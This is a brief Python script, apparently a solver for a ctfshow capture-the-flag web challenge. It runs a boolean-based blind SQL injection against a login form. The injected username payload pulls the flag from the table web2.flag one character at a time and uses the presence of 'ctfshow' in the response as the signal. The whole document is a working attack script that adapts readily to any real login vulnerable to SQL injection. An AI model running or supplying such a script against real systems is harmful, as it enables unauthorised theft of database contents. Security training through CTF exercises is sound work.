import requests
import string

str1='123456789'+string.ascii_letters+string.punctuation
flag=''
url=""
for j in range(1,88):
    for i in str1:
        paylaod = "0' or (if(substr((select flag from web2.flag),{},1)='{}',1,0))#".format(j, i)
        data={
            'username':paylaod,
            'password':'admin'
        }
        r=requests.post(url,data=data)
        if 'ctfshow' in r.text:
            flag+=i
            print(flag)
            break